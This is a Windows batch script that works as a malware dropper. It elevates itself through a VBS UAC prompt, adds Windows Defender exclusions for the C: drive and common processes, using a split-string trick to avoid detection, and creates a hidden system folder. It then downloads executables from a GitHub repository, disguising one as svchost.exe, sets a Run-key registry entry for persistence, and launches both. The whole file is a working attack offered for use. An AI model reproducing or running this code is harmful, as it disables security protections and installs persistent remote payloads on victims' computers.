@echo off
setlocal enabledelayedexpansion

set "p2=getadmin.vbs"
cd /d "%~dp0"
fsutil dirty query %systemdrive% >nul 2>&1 || (
  echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\%p2%"
  echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %*", "", "runas", 1 >> "%temp%\%p2%"
  "%temp%\%p2%"
  exit /b
)
if exist "%temp%\%p2%" del "%temp%\%p2%"

powershell -NoProfile -ExecutionPolicy Bypass -Command "$a='Add-'; $b='MpPreference'; $cmd=$a+$b; & $cmd -ExclusionPath 'C:\', 'C:\indiva' -ExclusionProcess 'cmd.exe', 'powershell.exe', 'svchost.exe' -Force"

if not exist "C:\indiva" mkdir "C:\indiva"
attrib +s +h "C:\indiva"

powershell -Command "Invoke-WebRequest -Uri 'https://github.com/Pythonist310/46fyr/raw/main/Minecraft.exe' -OutFile 'C:\indiva\svchost.exe'"

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Host Process Services" /t REG_SZ /d "C:\indiva\svchost.exe" /f >nul

start "" "C:\indiva\svchost.exe"

powershell -Command "Invoke-WebRequest -Uri 'https://github.com/Pythonist310/46fyr/raw/main/IndivaProject.exe' -OutFile 'C:\indiva\indiva.exe'"
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/Pythonist310/46fyr/raw/main/1.jpg' -OutFile 'C:\indiva\1.jpg'"
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/Pythonist310/46fyr/raw/main/2.jpg' -OutFile 'C:\indiva\2.jpg'"
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/Pythonist310/46fyr/raw/main/3.jpeg' -OutFile 'C:\indiva\3.jpg'"
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/Pythonist310/46fyr/raw/main/4.mp3' -OutFile 'C:\indiva\4.mp3'"
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/Pythonist310/46fyr/raw/main/5.mp4' -OutFile 'C:\indiva\5.mp4'"
timeout /t 10
start "" "C:\indiva\indiva.exe"

exit /B
